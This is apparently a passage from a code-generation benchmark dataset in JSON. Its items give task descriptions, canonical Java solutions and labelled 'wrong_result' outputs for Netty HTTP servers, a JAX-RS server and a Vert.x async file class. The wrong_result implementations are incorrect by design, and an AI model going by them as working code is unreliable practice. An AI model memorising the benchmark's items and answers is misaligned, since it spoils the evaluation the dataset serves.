persistedSequenceNumberConsumer;\n        this.writeLock = Locks.acquireWriteLock(this);\n    }\n\n    public void writeAndReleaseOps(ReleasableBytesReference bytesRef) throws IOException {\n        try (ReleasableLock ignored = writeLock.acquire()) {\n            if (closed.get()) {\n                throw new IOException(\"Writer is already closed\");\n            }\n            ByteBuffer byteBuffer = bytesRef.slice().duplicate().nioByteBuffer();\n            writeToFile(byteBuffer);\n            bytesRef.release();\n        }\n    }\n\n    private void writeToFile(ByteBuffer buffer) throws IOException {\n        while (buffer.hasRemaining()) {\n            channel.write(buffer);\n        }\n    }\n\n    public void readBytes(ByteBuffer target, long position) throws IOException {\n        synchronized (syncLock) {\n            channel.position(position);\n            while (target.hasRemaining()) {\n                channel.read(target);\n            }\n        }\n    }\n\n    public static void writeCheckpoint(FileChannel channel, Path path, Checkpoint checkpoint) throws IOException {\n        try {\n            channel.truncate(0);\n            channel.position(0);\n            channel.write(checkpoint.toBytes().toNioByteBuffers().get(0));\n        } finally {\n            channel.force(true);\n        }\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            IOUtils.closeWhileHandlingException(channel, checkpointChannel);\n            buffer.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 164,
    "Instruction": "Task Description: Create a Java class that implements an HTTP server using Netty framework, capable of handling HTTP requests with configurable thread pool settings and connection management.\n\nClass Description: Netty4HttpServer is a Netty-based HTTP server implementation that handles incoming HTTP requests using configurable worker threads and connection pooling. It extends AbstractServer and implements StatisticCallback for monitoring purposes.\n\nAttributes:\n- httpMessageHandler: HttpMessageHandler - Handler for processing HTTP requests\n- url: URL - Server configuration URL containing parameters like port, thread settings\n- channel: Channel - Netty channel for server communication\n- bossGroup: EventLoopGroup - Netty event loop group for accepting connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- standardThreadExecutor: StandardThreadExecutor - Thread pool for request processing\n\nMethods:\n- open() -> boolean - Initializes and starts the HTTP server, returns true if successful\n  Input: None\n  Output: boolean indicating success/failure of server startup\n\n- close(int timeout) -> void - Shuts down the server gracefully within specified timeout\n  Input: timeout - maximum time to wait for shutdown (in milliseconds)\n  Output: None\n\n- processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) -> void - Processes incoming HTTP requests\n  Input: \n    ctx - ChannelHandlerContext for the connection\n    httpRequest - Full HTTP request object\n  Output: None\n\n- sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) -> void - Sends HTTP response to client\n  Input:\n    ctx - ChannelHandlerContext for the connection\n    httpResponse - Full HTTP response object\n  Output: None\n\n- getUrl() -> URL - Returns server configuration URL\n  Input: None\n  Output: URL object containing server configuration",
    "Canonical_solution": "import com.weibo.api.motan.common.ChannelState;\nimport com.weibo.api.motan.common.MotanConstants;\nimport com.weibo.api.motan.common.URLParamType;\nimport com.weibo.api.motan.core.DefaultThreadFactory;\nimport com.weibo.api.motan.core.StandardThreadExecutor;\nimport com.weibo.api.motan.exception.MotanFrameworkException;\nimport com.weibo.api.motan.rpc.Request;\nimport com.weibo.api.motan.rpc.Response;\nimport com.weibo.api.motan.rpc.URL;\nimport com.weibo.api.motan.transport.AbstractServer;\nimport com.weibo.api.motan.transport.TransportException;\nimport com.weibo.api.motan.util.LoggerUtil;\nimport com.weibo.api.motan.util.StatisticCallback;\nimport com.weibo.api.motan.util.StatsUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.stream.ChunkedWriteHandler;\n\nimport java.net.InetSocketAddress;\n\npublic class Netty4HttpServer extends AbstractServer implements StatisticCallback {\n    private HttpMessageHandler httpMessageHandler;\n    private URL url;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private StandardThreadExecutor standardThreadExecutor;\n\n    public Netty4HttpServer(URL url, HttpMessageHandler httpMessageHandler) {\n        this.url = url;\n        this.httpMessageHandler = httpMessageHandler;\n    }\n\n    @Override\n    public synchronized boolean open() {\n        if (isAvailable()) {\n            return true;\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup == null) {\n            bossGroup = new NioEventLoopGroup();\n            workerGroup = new NioEventLoopGroup();\n        }\n        boolean shareChannel = url.getBooleanParameter(URLParamType.shareChannel.getName(), URLParamType.shareChannel.getBooleanValue());\n        int workerQueueSize = url.getIntParameter(URLParamType.workerQueueSize.getName(), 500);\n\n        int minWorkerThread, maxWorkerThread;\n\n        if (shareChannel) {\n            minWorkerThread = url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MIN_WORKDER);\n            maxWorkerThread = url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_SHARECHANNEL_MAX_WORKDER);\n        } else {\n            minWorkerThread =\n                    url.getIntParameter(URLParamType.minWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MIN_WORKDER);\n            maxWorkerThread =\n                    url.getIntParameter(URLParamType.maxWorkerThread.getName(), MotanConstants.NETTY_NOT_SHARECHANNEL_MAX_WORKDER);\n        }\n        final int maxContentLength = url.getIntParameter(URLParamType.maxContentLength.getName(), URLParamType.maxContentLength.getIntValue());\n        standardThreadExecutor = (standardThreadExecutor != null && !standardThreadExecutor.isShutdown()) ? standardThreadExecutor\n                : new StandardThreadExecutor(minWorkerThread, maxWorkerThread, workerQueueSize, new DefaultThreadFactory(\"NettyServer-\" + url.getServerPortStr(), true));\n        standardThreadExecutor.prestartAllCoreThreads();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup).channel(NioServerSocketChannel.class).childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) {\n                ch.pipeline().addLast(\"http-decoder\", new HttpRequestDecoder());\n                ch.pipeline().addLast(\"http-aggregator\", new HttpObjectAggregator(maxContentLength));\n                ch.pipeline().addLast(\"http-encoder\", new HttpResponseEncoder());\n                ch.pipeline().addLast(\"http-chunked\", new ChunkedWriteHandler());\n                ch.pipeline().addLast(\"serverHandler\", new SimpleChannelInboundHandler<FullHttpRequest>() {\n                    protected void channelRead0(final ChannelHandlerContext ctx, final FullHttpRequest httpRequest) {\n                        httpRequest.content().retain();\n                        try {\n                            standardThreadExecutor.execute(() -> processHttpRequest(ctx, httpRequest));\n                        } catch (Exception e) {\n                            LoggerUtil.error(\"request is rejected by threadPool!\", e);\n                            httpRequest.content().release();\n                            sendResponse(ctx, NettyHttpUtil.buildErrorResponse(\"request is rejected by thread pool!\"));\n                        }\n                    }\n                });\n            }\n        }).option(ChannelOption.SO_BACKLOG, 1024).childOption(ChannelOption.SO_KEEPALIVE, false);\n\n        ChannelFuture f;\n        try {\n            f = b.bind(url.getPort()).sync();\n            channel = f.channel();\n        } catch (InterruptedException e) {\n            LoggerUtil.error(\"init http server fail.\", e);\n            return false;\n        }\n        setLocalAddress((InetSocketAddress) channel.localAddress());\n        if (url.getPort() == 0) {\n            url.setPort(getLocalAddress().getPort());\n        }\n        state = ChannelState.ALIVE;\n        StatsUtil.registryStatisticCallback(this);\n        LoggerUtil.info(\"Netty4HttpServer ServerChannel finish Open: url=\" + url);\n        return true;\n    }\n\n    private void processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) {\n        FullHttpResponse httpResponse;\n        try {\n            httpRequest.headers().set(URLParamType.host.getName(), ((InetSocketAddress) ctx.channel().remoteAddress()).getAddress().getHostAddress());\n            httpResponse = httpMessageHandler.handle(this, httpRequest);\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyHttpHandler process http request fail.\", e);\n            httpResponse = NettyHttpUtil.buildErrorResponse(e.getMessage());\n        } finally {\n            httpRequest.content().release();\n        }\n        sendResponse(ctx, httpResponse);\n    }\n\n    private void sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) {\n        boolean close = false;\n        try {\n            ctx.write(httpResponse);\n            ctx.flush();\n        } catch (Exception e) {\n            LoggerUtil.error(\"NettyHttpHandler write response fail.\", e);\n            close = true;\n        } finally {\n            if (close || httpResponse == null || !httpResponse.headers().contains(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE, true)) {\n                ctx.close();\n            }\n        }\n    }\n\n    @Override\n    public synchronized void close(int timeout) {\n        if (state.isCloseState()) {\n            LoggerUtil.info(\"Netty4HttpServer close fail: already close, url={}\", url.getUri());\n            return;\n        }\n\n        if (state.isUnInitState()) {\n            LoggerUtil.info(\"Netty4HttpServer close Fail: don't need to close because node is unInit state: url={}\",\n                    url.getUri());\n            return;\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (standardThreadExecutor != null) {\n            standardThreadExecutor.shutdownNow();\n        }\n        workerGroup = null;\n        bossGroup = null;\n        standardThreadExecutor = null;\n        channel = null;\n        state = ChannelState.CLOSE;\n        StatsUtil.unRegistryStatisticCallback(this);\n    }\n\n    @Override\n    public URL getUrl() {\n        return url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "```java\npublic class Netty4HttpServer extends AbstractServer implements StatisticCallback {\n    private HttpMessageHandler httpMessageHandler;\n    private URL url;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private StandardThreadExecutor standardThreadExecutor;\n\n    public boolean open() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new HttpServerCodec());\n                        pipeline.addLast(new HttpObjectAggregator(65536));\n                        pipeline.addLast(new SimpleChannelInboundHandler<FullHttpRequest>() {\n                            @Override\n                            protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest msg) throws Exception {\n                                processHttpRequest(ctx, msg);\n                            }\n                        });\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        try {\n            channel = bootstrap.bind(url.getPort()).sync().channel();\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public void close(int timeout) {\n        if (channel != null) {\n            channel.close().awaitUninterruptibly(timeout);\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully().awaitUninterruptibly(timeout);\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully().awaitUninterruptibly(timeout);\n        }\n    }\n\n    public void processHttpRequest(ChannelHandlerContext ctx, FullHttpRequest httpRequest) {\n        standardThreadExecutor.execute(() -> {\n            FullHttpResponse response = httpMessageHandler.handleRequest(httpRequest);\n            sendResponse(ctx, response);\n        });\n    }\n\n    public void sendResponse(ChannelHandlerContext ctx, FullHttpResponse httpResponse) {\n        httpResponse.headers().set(HttpHeaderNames.CONTENT_LENGTH, httpResponse.content().readableBytes());\n        httpResponse.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);\n        ctx.writeAndFlush(httpResponse).addListener(ChannelFutureListener.CLOSE_ON_FAILURE);\n    }\n\n    public URL getUrl() {\n        return url;\n    }\n}\n```"
  },
  {
    "Task_id": 176,
    "Instruction": "Task Description: Implement a Netty-based JAX-RS server class that handles HTTP requests and integrates with RESTEasy framework for RESTful service deployment.\n\nClass Description: SofaNettyJaxrsServer is a Netty-based embedded JAX-RS server implementation that provides HTTP communication capabilities and integrates with RESTEasy framework for RESTful service deployment. It supports both standard NIO and Epoll transport, SSL/TLS encryption, and customizable channel options.\n\nAttributes:\n- serverConfig: [ServerConfig] - Configuration object containing server settings\n- bootstrap: [ServerBootstrap] - Netty server bootstrap instance\n- hostname: [String] - Hostname to bind the server to\n- port: [int] - Port number to listen on\n- deployment: [ResteasyDeployment] - RESTEasy deployment configuration\n- root: [String] - Root resource path\n- domain: [SecurityDomain] - Security domain for authentication\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for I/O operations\n- eventExecutor: [EventLoopGroup] - Netty event executor for business logic\n- ioWorkerCount: [int] - Number of I/O worker threads\n- executorThreadCount: [int] - Number of executor threads\n- sslContext: [SSLContext] - SSL context for secure connections\n- maxRequestSize: [int] - Maximum allowed HTTP request size\n- backlog: [int] - Connection backlog size\n- channelHandlers: [List<ChannelHandler>] - Additional channel handlers\n- channelOptions: [Map<ChannelOption, Object>] - Channel options\n- childChannelOptions: [Map<ChannelOption, Object>] - Child channel options\n- httpChannelHandlers: [List<ChannelHandler>] - Additional HTTP channel handlers\n\nMethods:\n- start(): [void] - Starts the Netty server and binds it to the configured host and port\n- stop(): [void] - Stops the server and releases all resources\n- createChannelInitializer(): [ChannelInitializer<SocketChannel>] - Creates a channel initializer for new connections\n- setupHandlers(SocketChannel ch, RequestDispatcher dispatcher): [void] - Sets up the channel pipeline with required handlers\n- createRequestDispatcher(): [RequestDispatcher] - Creates a RESTEasy request dispatcher",
    "Canonical_solution": "import com.alipay.sofa.rpc.common.SystemInfo;\nimport com.alipay.sofa.rpc.common.struct.NamedThreadFactory;\nimport com.alipay.sofa.rpc.common.utils.StringUtils;\nimport com.alipay.sofa.rpc.config.ServerConfig;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.concurrent.EventExecutor;\nimport org.jboss.resteasy.core.SynchronousDispatcher;\nimport org.jboss.resteasy.plugins.server.embedded.EmbeddedJaxrsServer;\nimport org.jboss.resteasy.plugins.server.embedded.SecurityDomain;\nimport org.jboss.resteasy.plugins.server.netty.RequestDispatcher;\nimport org.jboss.resteasy.plugins.server.netty.RestEasyHttpRequestDecoder;\nimport org.jboss.resteasy.plugins.server.netty.RestEasyHttpResponseEncoder;\nimport org.jboss.resteasy.spi.ResteasyDeployment;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport java.net.InetSocketAddress;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\n\npublic class SofaNettyJaxrsServer implements EmbeddedJaxrsServer {\n\n    private final ServerConfig         serverConfig;\n    protected ServerBootstrap          bootstrap;\n    protected String                   hostname;\n    protected int                      port;\n    protected ResteasyDeployment       deployment;\n    protected String                   root;\n    protected SecurityDomain           domain;\n    private EventLoopGroup             eventLoopGroup;\n    private EventLoopGroup             eventExecutor;\n    private int                        ioWorkerCount;\n    private int                        executorThreadCount;\n    private SSLContext                 sslContext;\n    private int                        maxRequestSize;\n    private int                        backlog;\n    private List<ChannelHandler>       channelHandlers;\n    private Map<ChannelOption, Object> channelOptions;\n    private Map<ChannelOption, Object> childChannelOptions;\n    private List<ChannelHandler>       httpChannelHandlers;\n\n    public SofaNettyJaxrsServer(ServerConfig serverConfig) {\n        if (serverConfig == null) {\n            throw new IllegalArgumentException(\"server config is null\");\n        }\n        this.serverConfig = serverConfig;\n        this.deployment = new ResteasyDeployment();\n        this.root = \"\";\n        this.ioWorkerCount = SystemInfo.getCpuCores() * 2;\n        this.executorThreadCount = 16;\n        this.maxRequestSize = 1024 * 1024 * 10;\n        this.backlog = 128;\n        this.channelHandlers = Collections.emptyList();\n        this.channelOptions = Collections.emptyMap();\n        this.childChannelOptions = Collections.emptyMap();\n        this.httpChannelHandlers = Collections.emptyList();\n    }\n\n    @Override\n    public void start() {\n        boolean daemon = serverConfig.isDaemon();\n        boolean isEpoll = serverConfig.isEpoll();\n        NamedThreadFactory ioFactory = new NamedThreadFactory(\"SEV-REST-IO-\" + port, daemon);\n        NamedThreadFactory bizFactory = new NamedThreadFactory(\"SEV-REST-BIZ-\" + port, daemon);\n        eventLoopGroup = isEpoll ? new EpollEventLoopGroup(ioWorkerCount, ioFactory)\n            : new NioEventLoopGroup(ioWorkerCount, ioFactory);\n        eventExecutor = isEpoll ? new EpollEventLoopGroup(executorThreadCount, bizFactory)\n            : new NioEventLoopGroup(executorThreadCount, bizFactory);\n\n        bootstrap = new ServerBootstrap()\n            .group(eventLoopGroup)\n            .channel(isEpoll ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n            .childHandler(createChannelInitializer())\n            .option(ChannelOption.SO_BACKLOG, backlog)\n            .childOption(ChannelOption.SO_KEEPALIVE, serverConfig.isKeepAlive());\n\n        for (Map.Entry<ChannelOption, Object> entry : channelOptions.entrySet()) {\n            bootstrap.option(entry.getKey(), entry.getValue());\n        }\n\n        for (Map.Entry<ChannelOption, Object> entry : childChannelOptions.entrySet()) {\n            bootstrap.childOption(entry.getKey(), entry.getValue());\n        }\n\n        final InetSocketAddress socketAddress;\n        if (null == hostname || hostname.isEmpty()) {\n            socketAddress = new InetSocketAddress(port);\n        } else {\n            socketAddress = new InetSocketAddress(hostname, port);\n        }\n\n        bootstrap.bind(socketAddress).syncUninterruptibly();\n    }\n\n    private ChannelInitializer<SocketChannel> createChannelInitializer() {\n        final RequestDispatcher dispatcher = createRequestDispatcher();\n        if (sslContext == null) {\n            return new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    setupHandlers(ch, dispatcher);\n                }\n            };\n        } else {\n            final SSLEngine engine = sslContext.createSSLEngine();\n            engine.setUseClientMode(false);\n            return new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addFirst(new SslHandler(engine));\n                    setupHandlers(ch, dispatcher);\n                }\n            };\n        }\n    }\n\n    private void setupHandlers(SocketChannel ch, RequestDispatcher dispatcher) {\n        ChannelPipeline channelPipeline = ch.pipeline();\n        channelPipeline.addLast(channelHandlers.toArray(new ChannelHandler[channelHandlers.size()]));\n        channelPipeline.addLast(new HttpRequestDecoder());\n        channelPipeline.addLast(new HttpObjectAggregator(maxRequestSize));\n        channelPipeline.addLast(new HttpResponseEncoder());\n        channelPipeline.addLast(httpChannelHandlers.toArray(new ChannelHandler[httpChannelHandlers.size()]));\n        channelPipeline.addLast(new RestEasyHttpRequestDecoder(dispatcher.getDispatcher(), root));\n        channelPipeline.addLast(new RestEasyHttpResponseEncoder());\n        channelPipeline.addLast(eventExecutor, new SofaRestRequestHandler(dispatcher));\n    }\n\n    protected RequestDispatcher createRequestDispatcher() {\n        return new RequestDispatcher((SynchronousDispatcher) deployment.getDispatcher(),\n            deployment.getProviderFactory(), domain);\n    }\n\n    @Override\n    public void stop() {\n        try {\n            eventLoopGroup.shutdownGracefully().sync();\n            eventExecutor.shutdownGracefully().sync();\n        } catch (Exception ignore) {\n        }\n        bootstrap = null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "```java\npublic class SofaNettyJaxrsServer {\n    private ServerConfig serverConfig;\n    private ServerBootstrap bootstrap;\n    private String hostname;\n    private int port;\n    private ResteasyDeployment deployment;\n    private String root;\n    private SecurityDomain domain;\n    private EventLoopGroup eventLoopGroup;\n    private EventLoopGroup eventExecutor;\n    private int ioWorkerCount;\n    private int executorThreadCount;\n    private SSLContext sslContext;\n    private int maxRequestSize;\n    private int backlog;\n    private List<ChannelHandler> channelHandlers;\n    private Map<ChannelOption<?>, Object> channelOptions;\n    private Map<ChannelOption<?>, Object> childChannelOptions;\n    private List<ChannelHandler> httpChannelHandlers;\n\n    public void start() {\n        try {\n            configure();\n            ChannelFuture future = bootstrap.bind(hostname, port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        if (bootstrap != null) {\n            bootstrap.config().group().shutdownGracefully();\n            bootstrap.config().childGroup().shutdownGracefully();\n        }\n    }\n\n    protected ChannelInitializer<SocketChannel> createChannelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                setupHandlers(ch, createRequestDispatcher());\n            }\n        };\n    }\n\n    protected void setupHandlers(SocketChannel ch, RequestDispatcher dispatcher) {\n        ChannelPipeline pipeline = ch.pipeline();\n\n        if (sslContext != null) {\n            SSLEngine engine = sslContext.createSSLEngine();\n            engine.setUseClientMode(false);\n            pipeline.addLast(\"ssl\", new SslHandler(engine));\n        }\n\n        pipeline.addLast(new HttpServerCodec());\n        pipeline.addLast(new HttpObjectAggregator(maxRequestSize));\n\n        if (channelHandlers != null) {\n            for (ChannelHandler handler : channelHandlers) {\n                pipeline.addLast(handler);\n            }\n        }\n\n        pipeline.addLast(new SimpleChannelInboundHandler<FullHttpRequest>() {\n            @Override\n            protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {\n                HttpResponse response = dispatcher.dispatch(request);\n                ctx.writeAndFlush(response);\n            }\n        });\n\n        if (httpChannelHandlers != null) {\n            for (ChannelHandler handler : httpChannelHandlers) {\n                pipeline.addLast(handler);\n            }\n        }\n    }\n\n    protected RequestDispatcher createRequestDispatcher() {\n        deployment.start();\n        return new RequestDispatcher(deployment.getRegistry(), deployment.getResourceMethodRegistry());\n    }\n\n    private void configure() {\n        eventLoopGroup = new NioEventLoopGroup(ioWorkerCount);\n        eventExecutor = new NioEventLoopGroup(executorThreadCount);\n\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(eventLoopGroup, eventExecutor)\n                .option(ChannelOption.SO_BACKLOG, backlog)\n                .childOption(ChannelOption.AUTO_READ, true)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .childHandler(createChannelInitializer());\n\n        if (channelOptions != null) {\n            for (Map.Entry<ChannelOption<?>, Object> entry : channelOptions.entrySet()) {\n                bootstrap.option(entry.getKey(), entry.getValue());\n            }\n        }\n\n        if (childChannelOptions != null) {\n            for (Map.Entry<ChannelOption<?>, Object> entry : childChannelOptions.entrySet()) {\n                bootstrap.childOption(entry.getKey(), entry.getValue());\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 18,
    "Instruction": "Task Description: Implement an asynchronous file handling class in Java using NIO's AsynchronousFileChannel for non-blocking file operations, supporting both reading and writing with various file opening options.\n\nClass Description: AsyncFileImpl is an implementation of AsyncFile interface that provides asynchronous file operations using Java NIO. It handles file reading, writing, and closing operations in a non-blocking manner, with support for various file opening modes and permissions.\n\nAttributes:\n- vertx: VertxInternal - The Vert.x instance for asynchronous operations\n- ch: AsynchronousFileChannel - The NIO asynchronous file channel\n- context: ContextInternal - The Vert.x context for operation execution\n- closed: boolean - Flag indicating if the file is closed\n- writePos: long - Current write position in the file\n- readBufferSize: int - Size of the read buffer (default 8192)\n- handler: Handler<Buffer> - Handler for read operations\n- endHandler: Handler<Void> - Handler for end of file operations\n- readPos: long - Current read position in the file\n- readLength: long - Maximum length to read (default Long.MAX_VALUE)\n\nMethods:\n- AsyncFileImpl(VertxInternal vertx, String path, OpenOptions options, ContextInternal context) -> [Constructor] - Initializes the file channel with specified path and options\n- close() -> Future<Void> - Closes the file channel and releases resources\n- read(Buffer buffer, int offset, long position, int length) -> Future<Buffer> - Reads data from file into buffer at specified position\n- write(Buffer buffer, long position) -> Future<Void> - Writes buffer content to file at specified position\n- doWrite(Buffer buffer, long position, Handler<AsyncResult<Void>> handler) -> void - Internal method for write operation\n- doWrite(ByteBuffer[] buffers, long position, Handler<AsyncResult<Void>> handler) -> void - Internal method for writing multiple buffers\n- doWrite(ByteBuffer buff, long position, long toWrite, Handler<AsyncResult<Void>> handler) -> void - Internal method for writing buffer content\n- writeInternal(ByteBuffer buff, long position, Handler<AsyncResult<Void>> handler) -> void - Core write implementation using CompletionHandler\n- doRead(Buffer writeBuff, int offset, ByteBuffer buff, long position, Promise<Buffer> promise) -> void - Internal method for read operation\n- check() -> void - Verifies if file is not closed\n- closeInternal(Promise<Void> handler) -> void - Internal method for closing the file channel",
    "Canonical_solution": "import io.vertx.core.AsyncResult;\nimport io.vertx.core.Future;\nimport io.vertx.core.Handler;\nimport io.vertx.core.Promise;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.internal.buffer.BufferInternal;\nimport io.vertx.core.file.AsyncFile;\nimport io.vertx.core.file.FileSystemException;\nimport io.vertx.core.file.OpenOptions;\nimport io.vertx.core.impl.Arguments;\nimport io.vertx.core.internal.ContextInternal;\nimport io.vertx.core.internal.VertxInternal;\nimport io.vertx.core.internal.logging.Logger;\nimport io.vertx.core.internal.logging.LoggerFactory;\nimport io.vertx.core.streams.impl.InboundBuffer;\n\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.AsynchronousFileChannel;\nimport java.nio.channels.CompletionHandler;\nimport java.nio.file.OpenOption;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.nio.file.attribute.FileAttribute;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.HashSet;\nimport java.util.Objects;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class AsyncFileImpl implements AsyncFile {\n\n    private static final Logger log = LoggerFactory.getLogger(AsyncFile.class);\n\n    private final VertxInternal vertx;\n    private final AsynchronousFileChannel ch;\n    private final ContextInternal context;\n    private boolean closed;\n    private long writePos;\n    private int readBufferSize = 8192;\n    private Handler<Buffer> handler;\n    private Handler<Void> endHandler;\n    private long readPos;\n    private long readLength = Long.MAX_VALUE;\n\n    public AsyncFileImpl(VertxInternal vertx, String path, OpenOptions options, ContextInternal context) {\n        this.vertx = vertx;\n        Path file = Paths.get(path);\n        HashSet<OpenOption> opts = new HashSet<>();\n        if (options.isRead()) opts.add(StandardOpenOption.READ);\n        if (options.isWrite()) opts.add(StandardOpenOption.WRITE);\n        if (options.isCreate()) opts.add(StandardOpenOption.CREATE);\n        if (options.isCreateNew()) opts.add(StandardOpenOption.CREATE_NEW);\n        if (options.isSync()) opts.add(StandardOpenOption.SYNC);\n        if (options.isDsync()) opts.add(StandardOpenOption.DSYNC);\n        if (options.isDeleteOnClose()) opts.add(StandardOpenOption.DELETE_ON_CLOSE);\n        if (options.isSparse()) opts.add(StandardOpenOption.SPARSE);\n        if (options.isTruncateExisting()) opts.add(StandardOpenOption.TRUNCATE_EXISTING);\n        try {\n            if (options.getPerms() != null) {\n                FileAttribute<?> attrs = PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString(options.getPerms()));\n                ch = AsynchronousFileChannel.open(file, opts, vertx.getWorkerPool().executor(), attrs);\n            } else {\n                ch = AsynchronousFileChannel.open(file, opts, vertx.getWorkerPool().executor());\n            }\n            if (options.isAppend()) writePos = ch.size();\n        } catch (IOException e) {\n            throw new FileSystemException(e);\n        }\n        this.context = context;\n    }\n\n    @Override\n    public Future<Void> close() {\n        Promise<Void> promise = context.promise();\n        closeInternal(promise);\n        return promise.future();\n    }\n\n    @Override\n    public Future<Buffer> read(Buffer buffer, int offset, long position, int length) {\n        Promise<Buffer> promise = context.promise();\n        Objects.requireNonNull(buffer, \"buffer\");\n        Arguments.require(offset >= 0, \"offset must be >= 0\");\n        Arguments.require(position >= 0, \"position must be >= 0\");\n        Arguments.require(length >= 0, \"length must be >= 0\");\n        check();\n        ByteBuffer bb = ByteBuffer.allocate(length);\n        doRead(buffer, offset, bb, position, promise);\n        return promise.future();\n    }\n\n    @Override\n    public Future<Void> write(Buffer buffer, long position) {\n        Promise<Void> promise = context.promise();\n        doWrite(buffer, position, promise::handle);\n        return promise.future();\n    }\n\n    private void doWrite(Buffer buffer, long position, Handler<AsyncResult<Void>> handler) {\n        Objects.requireNonNull(buffer, \"buffer\");\n        Arguments.require(position >= 0, \"position must be >= 0\");\n        check();\n        ByteBuf buf = ((BufferInternal)buffer).getByteBuf();\n        if (buf.nioBufferCount() > 1) {\n            doWrite(buf.nioBuffers(), position, handler);\n        } else {\n            ByteBuffer bb = buf.nioBuffer();\n            doWrite(bb, position, bb.limit(), handler);\n        }\n    }\n\n    private void doWrite(ByteBuffer[] buffers, long position, Handler<AsyncResult<Void>> handler) {\n        AtomicInteger cnt = new AtomicInteger();\n        AtomicBoolean sentFailure = new AtomicBoolean();\n        for (ByteBuffer b: buffers) {\n            int limit = b.limit();\n            doWrite(b, position, limit, ar -> {\n                if (ar.succeeded()) {\n                    if (cnt.incrementAndGet() == buffers.length) {\n                        handler.handle(ar);\n                    }\n                } else {\n                    if (sentFailure.compareAndSet(false, true)) {\n                        handler.handle(ar);\n                    }\n                }\n            });\n            position += limit;\n        }\n    }\n\n    private void doWrite(ByteBuffer buff, long position, long toWrite, Handler<AsyncResult<Void>> handler) {\n        if (toWrite > 0) {\n            writeInternal(buff, position, handler);\n        } else {\n            handler.handle(Future.succeededFuture());\n        }\n    }\n\n    private void 